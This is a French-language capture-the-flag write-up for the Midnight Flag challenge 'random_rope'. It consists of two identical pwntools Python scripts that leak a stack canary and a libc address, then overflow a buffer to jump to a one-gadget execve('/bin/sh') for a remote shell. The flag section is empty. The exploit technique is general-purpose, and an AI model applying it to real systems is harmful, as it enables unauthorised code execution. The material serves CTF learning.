# Description
[Noiche] : Lors de mon évasion, j'ai déroulé une corde sur mon chemin. Suivre la route tracée par cette corde devrait vous amener dans la salle secrète du goulag. Qui sait, vous y trouverez peut-être quelque chose d'intéressant... En tout cas, débrouillez vous !! Moi, je n'y retournerai pas !!
Accès au challenge : `nc ctf.midnightflag.fr 9024`

# Write UP
# 1
```python
#!/usr/bin/python

from pwn import *

elf = ELF('./random_rope')
libc = ELF('./libc-2.28.so')

r = remote('ctf.midnightflag.fr', 9024)

res = r.recv().splitlines()

nums = res[1].split(' : ')[1].split(' ')

canary = int(nums[14]) & 0xffffffff
libc_base = (int(nums[15]) & 0xffffffff) - libc.sym['_IO_2_1_stdout_']

log.success('Canary: %s' % hex(canary))
log.success('libc: %s' % hex(libc_base))

buf = '\x00'*32 # Maximize chances to get one gadget working
buf += p32(canary)
buf += p32(libc_base + 0x3e8d3) * 4 # one gadget

"""
0x3e8d3 execve("/bin/sh", esp+0x40, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x40] == NULL
"""

r.sendline(buf)

r.interactive()
```

# 2
```python
#!/usr/bin/python

from pwn import *

elf = ELF('./random_rope')
libc = ELF('./libc-2.28.so')

r = remote('ctf.midnightflag.fr', 9024)

res = r.recv().splitlines()

nums = res[1].split(' : ')[1].split(' ')

canary = int(nums[14]) & 0xffffffff
libc_base = (int(nums[15]) & 0xffffffff) - libc.sym['_IO_2_1_stdout_']

log.success('Canary: %s' % hex(canary))
log.success('libc: %s' % hex(libc_base))

buf = '\x00'*32 # Maximize chances to get one gadget working
buf += p32(canary)
buf += p32(libc_base + 0x3e8d3) * 4 # one gadget

"""
0x3e8d3 execve("/bin/sh", esp+0x40, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x40] == NULL
"""

r.sendline(buf)

r.interactive()
```

# Flag
- 
